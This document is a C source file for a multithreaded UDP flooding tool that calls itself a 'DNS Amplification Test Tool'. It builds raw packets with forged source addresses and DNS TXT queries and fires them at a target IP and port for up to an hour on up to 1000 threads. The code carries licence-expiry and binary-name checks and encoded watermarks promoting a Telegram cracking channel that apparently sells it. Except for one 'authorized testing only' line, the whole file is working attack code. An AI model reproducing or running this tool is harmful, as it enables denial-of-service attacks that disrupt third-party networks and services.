#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <signal.h>
#include <pthread.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <unistd.h>
#include <ctype.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <errno.h>

// ======================
// 🔧 CONFIGURATION
// ======================
#define BINARY_NAME "DNSTest"
#define MAX_THREADS 1000
#define MAX_UDP_PAYLOAD 1472
#define DEFAULT_PAYLOAD_SIZE 64
#define BATCH_SIZE 20
#define BATCH_DELAY_US 10000
#define EXPIRATION_YEAR 2054
#define EXPIRATION_MONTH 11
#define EXPIRATION_DAY 1

// 🌐 DNS Amplifiers (configurable public DNS servers)
const char* dns_reflectors[] = {
    "8.8.8.8",      // Google DNS
};
#define NUM_DNS (sizeof(dns_reflectors) / sizeof(dns_reflectors[0]))

// 🌍 Target domains for random subdomains
const char* base_domains[] = {
    "google.com", "facebook.com", "youtube.com", "github.com", "netflix.com"
};
#define NUM_DOMAINS (sizeof(base_domains) / sizeof(base_domains[0]))

// Attack configuration structure
struct AttackConfig {
    char* ip;
    int port;
    int duration;
    int thread_count;
    int payload_size;
};

// Global stop flag for signal handling
volatile sig_atomic_t stop_flag = 0;

// Random char for domain fuzzing
char rand_char(unsigned int* seed) {
    const char charset[] = "abcdefghijklmnopqrstuvwxyz0123456789";
    return charset[rand_r(seed) % (sizeof(charset) - 1)];
}

// Generate random subdomain (e.g., "a3k9.google.com")
void random_domain(char* result, unsigned int* seed) {
    char sub[16] = {0};
    int len = 4 + (rand_r(seed) % 6); // 4–9 chars
    for (int i = 0; i < len; ++i) {
        sub[i] = rand_char(seed);
    }
    snprintf(result, 256, "%s.%s", sub, base_domains[rand_r(seed) % NUM_DOMAINS]);
}

// IP header checksum
unsigned short ip_checksum(unsigned short* buf, int nwords) {
    unsigned long sum = 0;
    while (nwords-- > 0) sum += *buf++;
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    return (unsigned short)(~sum);
}

// UDP checksum
unsigned short udp_checksum(struct iphdr* iph, struct udphdr* udph, char* data, int data_len) {
    unsigned long sum = 0;
    // Pseudo-header: IP source/dest, protocol, UDP length
    sum += (iph->saddr >> 16) + (iph->saddr & 0xFFFF);
    sum += (iph->daddr >> 16) + (iph->daddr & 0xFFFF);
    sum += IPPROTO_UDP;
    sum += ntohs(udph->len);
    // UDP header
    unsigned short* buf = (unsigned short*)udph;
    int len = ntohs(udph->len);
    for (int i = 0; i < len / 2; i++) sum += buf[i];
    if (len % 2) sum += *(unsigned char*)((char*)buf + len - 1);
    // Data
    buf = (unsigned short*)data;
    for (int i = 0; i < data_len / 2; i++) sum += buf[i];
    if (data_len % 2) sum += *(unsigned char*)((char*)buf + data_len - 1);
    // Fold sum
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    return (unsigned short)(~sum);
}

// Build DNS payload (TXT query for large responses)
int build_dns_payload(char* buf, int max_size, unsigned int* seed) {
    int pos = 0;

    // DNS Header
    buf[pos++] = rand_r(seed) % 256; buf[pos++] = rand_r(seed) % 256; // Transaction ID
    buf[pos++] = 0x01; buf[pos++] = 0x00; // Standard query
    buf[pos++] = 0x00; buf[pos++] = 0x01; // QDCOUNT = 1
    buf[pos++] = 0x00; buf[pos++] = 0x00; // ANCOUNT = 0
    buf[pos++] = 0x00; buf[pos++] = 0x00; // NSCOUNT = 0
    buf[pos++] = 0x00; buf[pos++] = 0x00; // ARCOUNT = 0

    // QNAME (random subdomain)
    char domain[256];
    random_domain(domain, seed);
    char temp[256];
    strncpy(temp, domain, sizeof(temp) - 1);
    temp[sizeof(temp) - 1] = '\0';

    char* part = strtok(temp, ".");
    while (part && pos < max_size - 64) {
        size_t len = strlen(part);
        if (len == 0 || len > 63) len = 63;
        buf[pos++] = (unsigned char)len;
        memcpy(buf + pos, part, len);
        pos += len;
        part = strtok(NULL, ".");
    }
    buf[pos++] = 0x00; // End of QNAME

    // QTYPE = TXT (0x0010), QCLASS = IN (0x0001)
    buf[pos++] = 0x00; buf[pos++] = 0x10;
    buf[pos++] = 0x00; buf[pos++] = 0x01;

    // Fill remaining space with random data
    while (pos < max_size) buf[pos++] = rand_r(seed) % 256;
    return pos;
}

// Base64 encoding
void base64_encode(const unsigned char* data, char* encoded, size_t length) {
    const char* base64_chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    int i = 0, j = 0;
    unsigned char char_array_3[3], char_array_4[4];

    while (length--) {
        char_array_3[i++] = *(data++);
        if (i == 3) {
            char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
            char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
            char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
            char_array_4[3] = char_array_3[2] & 0x3f;

            for (i = 0; i < 4; i++) encoded[j++] = base64_chars[char_array_4[i]];
            i = 0;
        }
    }

    if (i) {
        for (int k = i; k < 3; k++) char_array_3[k] = '\0';
        char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
        char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
        char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
        char_array_4[3] = char_array_3[2] & 0x3f;

        for (int k = 0; k < i + 1; k++) encoded[j++] = base64_chars[char_array_4[k]];
        while (i++ < 3) encoded[j++] = '=';
    }
    encoded[j] = '\0';
}

// Base64 decoding
void base64_decode(const char* encoded, char* decoded) {
    const char* base64_chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    int i = 0, j = 0, in_len = strlen(encoded);
    unsigned char char_array_4[4], char_array_3[3];

    while (in_len-- && encoded[i] != '=' && (isalnum(encoded[i]) || encoded[i] == '+' || encoded[i] == '/')) {
        char_array_4[i++] = encoded[i];
        if (i == 4) {
            for (i = 0; i < 4; i++) {
                char_array_4[i] = strchr(base64_chars, char_array_4[i]) - base64_chars;
            }
            char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
            char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
            char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];

            for (i = 0; i < 3; i++) decoded[j++] = char_array_3[i];
            i = 0;
        }
    }

    if (i) {
        for (int k = i; k < 4; k++) char_array_4[k] = 0;
        for (int k = 0; k < i; k++) {
            char_array_4[k] = strchr(base64_chars, char_array_4[k]) - base64_chars;
        }
        char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
        char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
        char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];

        for (int k = 0; k < i - 1; k++) decoded[j++] = char_array_3[k];
    }
    decoded[j] = '\0';
}

// Check blocked ports
int is_blocked_port(int port) {
    return (port >= 100 && port <= 999) || (port == 17500) || (port >= 20000 && port <= 20002);
}

// Signal handler
void handle_signal(int sig) {
    printf("\n[!] Interrupt received. Stopping attack...\n");
    stop_flag = 1;
}

// Check expiration
int check_expiration() {
    struct tm expiry_date = {0};
    expiry_date.tm_year = EXPIRATION_YEAR - 1900;
    expiry_date.tm_mon = EXPIRATION_MONTH - 1;
    expiry_date.tm_mday = EXPIRATION_DAY;

    time_t now = time(NULL);
    time_t exp_time = mktime(&expiry_date);
    if (difftime(exp_time, now) < 0) {
        const char* encoded_error = "VGhpcyBmaWxlIGlzIGNsb3NlZCBAVklQTU9EU1hBRE1JTgpUaGlzIGlzIGZyZWUgdmVyc2lvbgpETSB0byBidXkKQFZJUE1PRFNYQURNSU4=";
        char decoded_error[512];
        base64_decode(encoded_error, decoded_error);
        fprintf(stderr, "╔════════════════════════════════════════╗\n");
        fprintf(stderr, "║ %s ║\n", decoded_error);
        fprintf(stderr, "╚════════════════════════════════════════╝\n");
        return 1;
    }
    return 0;
}

// Check binary name
void check_binary_name() {
    char exe_path[1024];
    ssize_t len = readlink("/proc/self/exe", exe_path, sizeof(exe_path) - 1);
    if (len != -1) {
        exe_path[len] = '\0';
        char* exe_name = strrchr(exe_path, '/');
        exe_name = exe_name ? exe_name + 1 : exe_path;
        if (strcmp(exe_name, BINARY_NAME) != 0) {
            fprintf(stderr, "╔════════════════════════════════════════╗\n");
            fprintf(stderr, "║         INVALID BINARY NAME!           ║\n");
            fprintf(stderr, "║    Binary must be named '%s'║\n", BINARY_NAME);
            fprintf(stderr, "╚════════════════════════════════════════╝\n");
            exit(EXIT_FAILURE);
        }
    }
}

// Validate IP
int is_valid_ip(const char* ip) {
    struct in_addr addr;
    return inet_pton(AF_INET, ip, &addr) == 1;
}

// Open URL for expiration notice
void open_url() {
    const char* url = "https://t.me/SOULCRACKS";
    char cmd[256];
    if (system("command -v xdg-open > /dev/null") == 0) {
        snprintf(cmd, sizeof(cmd), "xdg-open %s", url);
        system(cmd);
    } else if (system("command -v gnome-open > /dev/null") == 0) {
        snprintf(cmd, sizeof(cmd), "gnome-open %s", url);
        system(cmd);
    } else if (system("command -v open > /dev/null") == 0) {
        snprintf(cmd, sizeof(cmd), "open %s", url);
        system(cmd);
    } else if (system("command -v start > /dev/null") == 0) {
        snprintf(cmd, sizeof(cmd), "start %s", url);
        system(cmd);
    } else {
        fprintf(stderr, "Please visit: %s\n", url);
    }
}

// DNS amplification attack thread
void* udp_attack(void* arg) {
    struct AttackConfig* config = (struct AttackConfig*)arg;
    unsigned int seed = time(NULL) ^ pthread_self();

    // Create raw socket
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
    if (sock < 0) {
        fprintf(stderr, "[!] Thread %ld: Socket creation failed: %s\n", pthread_self(), strerror(errno));
        return NULL;
    }

    // Enable IP_HDRINCL
    int on = 1;
    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) < 0) {
        fprintf(stderr, "[!] Thread %ld: Setsockopt failed: %s\n", pthread_self(), strerror(errno));
        close(sock);
        return NULL;
    }

    // Target address
    struct sockaddr_in target_addr = {0};
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons((uint16_t)config->port);
    target_addr.sin_addr.s_addr = inet_addr(config->ip);

    char packet[MAX_UDP_PAYLOAD];
    time_t start_time = time(NULL);
    int packets_sent = 0;

    while (difftime(time(NULL), start_time) < config->duration && !stop_flag) {
        for (int i = 0; i < BATCH_SIZE; ++i) {
            memset(packet, 0, MAX_UDP_PAYLOAD);
            struct iphdr* iph = (struct iphdr*)packet;
            struct udphdr* udph = (struct udphdr*)(packet + sizeof(struct iphdr));
            char* data = packet + sizeof(struct iphdr) + sizeof(struct udphdr);

            // Build DNS payload
            int payload_len = build_dns_payload(data, MAX_UDP_PAYLOAD - sizeof(struct iphdr) - sizeof(struct udphdr), &seed);
            uint32_t spoofed_addr = inet_addr(dns_reflectors[rand_r(&seed) % NUM_DNS]);

            int total_len = sizeof(struct iphdr) + sizeof(struct udphdr) + payload_len;
            if (total_len > MAX_UDP_PAYLOAD) total_len = MAX_UDP_PAYLOAD;

            // IP Header
            iph->ihl = 5;
            iph->version = 4;
            iph->tos = 0;
            iph->tot_len = htons(total_len);
            iph->id = htons(rand_r(&seed) % 65535);
            iph->frag_off = 0;
            iph->ttl = 64;
            iph->protocol = IPPROTO_UDP;
            iph->saddr = spoofed_addr;
            iph->daddr = target_addr.sin_addr.s_addr;
            iph->check = ip_checksum((unsigned short*)packet, iph->ihl * 2);

            // UDP Header
            udph->source = htons(53);
            udph->dest = htons(config->port);
            udph->len = htons(sizeof(struct udphdr) + payload_len);
            udph->check = udp_checksum(iph, udph, data, payload_len);

            // Send packet
            ssize_t sent = sendto(sock, packet, total_len, 0, (struct sockaddr*)&target_addr, sizeof(target_addr));
            if (sent < 0) {
                fprintf(stderr, "[!] Thread %ld: Send failed: %s\n", pthread_self(), strerror(errno));
                break;
            }
            packets_sent++;
        }
        usleep(BATCH_DELAY_US);
    }

    printf("[+] Thread %ld: Sent %d packets\n", pthread_self(), packets_sent);
    close(sock);
    return NULL;
}

// Main function
int main(int argc, char* argv[]) {
    // Check arguments
    if (argc != 5) {
        fprintf(stderr, "╔════════════════════════════════════════╗\n");
        fprintf(stderr, "║      DNS Amplification Test Tool       ║\n");
        fprintf(stderr, "║ Usage: sudo %s <IP> <PORT> <DURATION> <THREADS> ║\n", argv[0]);
        fprintf(stderr, "║ Example: sudo %s 192.168.1.1 53 60 4   ║\n", argv[0]);
        fprintf(stderr, "╚════════════════════════════════════════╝\n");
        fprintf(stderr, "⚠️ For authorized testing only! Requires root privileges.\n");
        return EXIT_FAILURE;
    }

    // Initialize configuration
    struct AttackConfig config;
    config.ip = strdup(argv[1]);
    if (!config.ip) {
        fprintf(stderr, "[!] Memory allocation for IP failed\n");
        return EXIT_FAILURE;
    }
    config.port = atoi(argv[2]);
    config.duration = atoi(argv[3]);
    config.thread_count = atoi(argv[4]);
    config.payload_size = DEFAULT_PAYLOAD_SIZE;

    // Validate inputs
    if (!is_valid_ip(config.ip)) {
        fprintf(stderr, "[!] Invalid IP address: %s\n", config.ip);
        free(config.ip);
        return EXIT_FAILURE;
    }
    if (config.port <= 0 || config.port > 65535) {
        fprintf(stderr, "[!] Invalid port: %d\n", config.port);
        free(config.ip);
        return EXIT_FAILURE;
    }
    if (is_blocked_port(config.port)) {
        fprintf(stderr, "[!] Port %d is blocked!\n", config.port);
        free(config.ip);
        return EXIT_FAILURE;
    }
    if (config.duration <= 0 || config.duration > 3600) {
        fprintf(stderr, "[!] Invalid duration: %d (must be 1-3600 seconds)\n", config.duration);
        free(config.ip);
        return EXIT_FAILURE;
    }
    if (config.thread_count <= 0 || config.thread_count > MAX_THREADS) {
        fprintf(stderr, "[!] Invalid thread count: %d (max %d)\n", config.thread_count, MAX_THREADS);
        free(config.ip);
        return EXIT_FAILURE;
    }
    if (config.payload_size <= 0 || config.payload_size > MAX_UDP_PAYLOAD) {
        fprintf(stderr, "[!] Invalid payload size: %d (max %d)\n", config.payload_size, MAX_UDP_PAYLOAD);
        free(config.ip);
        return EXIT_FAILURE;
    }

    // Check binary name and expiration
    check_binary_name();
    if (check_expiration()) {
        open_url();
        free(config.ip);
        return EXIT_FAILURE;
    }

    // Print watermark
    const char* encoded_watermark = "QHRlbGVncmFtIGNoYW5uZWwgQFNPVUxDUkFDS1MgVklQTU9EU1hBRE1JTiBUZXJtcyBvZiBzZXJ2aWNlIHVzZSBhbmQgbGVnYWwgY29uc2lkZXJhdGlvbnMu";
    char decoded_watermark[256];
    base64_decode(encoded_watermark, decoded_watermark);
    printf("╔════════════════════════════════════════╗\n");
    printf("║          %s PROGRAM         ║\n", BINARY_NAME);
    printf("║         Copyright (c) 2024             ║\n");
    printf("║ %s ║\n", decoded_watermark);
    printf("╚════════════════════════════════════════╝\n\n");

    // Set up signal handler
    signal(SIGINT, handle_signal);

    // Print attack details
    printf("=====================================\n");
    printf("      DNS Amplification Test Tool     \n");
    printf("=====================================\n");
    printf("Target: %s:%d\n", config.ip, config.port);
    printf("Duration: %d seconds\n", config.duration);
    printf("Threads: %d\n", config.thread_count);
    printf("Payload Size: Up to %d bytes\n", MAX_UDP_PAYLOAD);
    printf("DNS Reflectors: %d servers\n", NUM_DNS);
    printf("=====================================\n\n");

    // Create threads
    pthread_t* threads = (pthread_t*)malloc(config.thread_count * sizeof(pthread_t));
    if (!threads) {
        fprintf(stderr, "[!] Thread allocation failed\n");
        free(config.ip);
        return EXIT_FAILURE;
    }

    for (int i = 0; i < config.thread_count; ++i) {
        if (pthread_create(&threads[i], NULL, udp_attack, &config) != 0) {
            fprintf(stderr, "[!] Thread %d creation failed: %s\n", i + 1, strerror(errno));
            continue;
        }
        printf("[+] Thread %d launched.\n", i + 1);
    }

    // Wait for threads to complete
    for (int i = 0; i < config.thread_count; ++i) {
        pthread_join(threads[i], NULL);
    }

    // Cleanup
    free(threads);
    free(config.ip);
    printf("\n[✔] DNS amplification test completed successfully.\n");

    return EXIT_SUCCESS;
}